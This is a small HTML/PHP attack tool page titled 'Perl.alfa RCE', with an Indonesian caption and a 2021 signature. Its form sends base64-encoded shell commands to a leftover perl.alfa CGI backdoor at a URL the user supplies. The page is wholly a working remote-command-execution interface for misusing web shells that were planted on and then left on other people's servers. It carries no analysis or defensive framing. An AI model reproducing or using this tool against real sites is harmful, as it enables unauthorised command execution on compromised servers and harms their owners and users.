<html>
<head>
<title>[+] Perl.alfa RCE [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body bgcolor="#1e1e1e" text="white"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
vuln {
  color: orange;
}
sayu {
  text-align: left;
}
</style>
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script>
    $(document).ready(function() {
        $('#formnya').submit(function(event) {
            // Prevent the default form submission to encode the value first
            event.preventDefault();

            // Temporarily store the original cmd value
            var originalCmd = $('#cmd').val();

            // Encode values to Base64 and submit the form
            $('#cmd').val(btoa(originalCmd));

            // Submit the form in a new window
            this.target = '_blank';
            this.submit();

            // Restore the original cmd value after submission
            $('#cmd').val(originalCmd);
        });
    });
</script>
<script type="text/javascript">
    function get_action(form) {
        form.action = document.getElementById("url").value;
    }
</script>
<form method="post" onsubmit="get_action(this);" target="_blank" id="formnya">
<font face=courier size=5>Perl.alfa RCE<br>
  <font size="3">RCE Pada perl.alfa yang lupa di hapus wkwk</font></font><hr>
  <font>Url : <br><input type="url" name="url" id="url" placeholder="https://exploits.my.id/alfacgiapi/perl.alfa" size="60" class="courier" value="<?php echo htmlspecialchars($_POST['url']);?>">
  <br><br>Command : <br>
<input id="cmd" rows=1 name="cmd" placeholder="ls -la" style="font-family: courier" required="true"><?php echo htmlspecialchars($_POST['cmd']); ?><br><br>
<input type="submit" name="gaskan" value="Gaskan">
</form>
<hr><font size="3">Unknown45 - 2021</font>